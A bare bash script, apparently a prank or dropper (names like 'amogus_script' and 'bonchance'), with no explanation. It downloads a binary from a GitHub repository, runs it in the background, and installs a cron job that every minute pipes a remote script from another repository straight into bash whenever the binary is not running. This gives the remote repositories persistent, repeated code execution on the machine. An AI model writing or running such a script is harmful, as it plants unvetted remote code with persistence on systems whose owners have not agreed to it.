#!/bin/bash

path=$(mktemp -d /tmp/XXXXXX)
cd $path
wget https://github.com/Waz0x/Waz0x.github.io/raw/main/bin/linux64.exe && chmod +x linux64.exe
nohup $path/linux64.exe &

if [[ -z "$(crontab -l | grep bonchance)" ]]; then
    crontab -l > crontabs
    echo '* * * * * bash -c "export DISPLAY=:0 && if [[ -z \"$(pidof linux64.exe)\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi"' >> crontabs
    crontab crontabs
fi
